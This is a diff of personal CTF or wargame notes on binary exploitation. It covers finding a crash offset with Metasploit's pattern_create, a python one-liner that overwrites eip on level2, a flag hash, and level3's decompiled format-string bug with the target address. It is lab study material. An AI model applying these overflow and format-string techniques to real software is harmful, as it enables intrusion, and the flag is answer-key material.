@@ -1,4 +1,3 @@
-
 ---
 tags: []
 Links: []
@@ -124,7 +123,7 @@ On this level, we can see that we don't have any function susceptible to open us
 Let's first determine what's the offset our program will crash at. For that purpose, we can use [[Metasploit]] tools:
 
 ```bash
-/usr/share/metasploit-framework/tools/exploit/./pattern_create.rb -l 100
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 100
 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
 ```
 
@@ -152,14 +151,42 @@ python -c "print ('A'*80 + '\x28\xf7\xff\xbf')" | ./level2
 (0xbffff728)
 ```
 
-0xffffcd82
+We can successfully overwrite `eip` here:
 
-len(shellcode) = 55
+![[Pasted image 20231211133102.png]]
 
+Now that we did that, we need to make sure `eip` points to somewhere in our shellcode. Since no [[ASLR]] happens here, we could just determine the address where our shellcode starts.
+
+`492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02`
 
 
 
 # level3
+
+```c
+void v(void)
+{
+  char buffer [520];
+
+  fgets(buffer,512,stdin);
+  printf(buffer);
+  if (m == 64) {
+    fwrite("Wait what?!\n",1,12,stdout);
+    system("/bin/sh");
+  }
+  return;
+}
+
+void main(void)
+{
+  v();
+  return;
+}
+```
+
+Address of m: `0x0804988c`
+
+[Exploit 101 - Format Strings - BreakInSecurity](https://axcheron.github.io/exploit-101-format-strings/)
 
 # level4
 
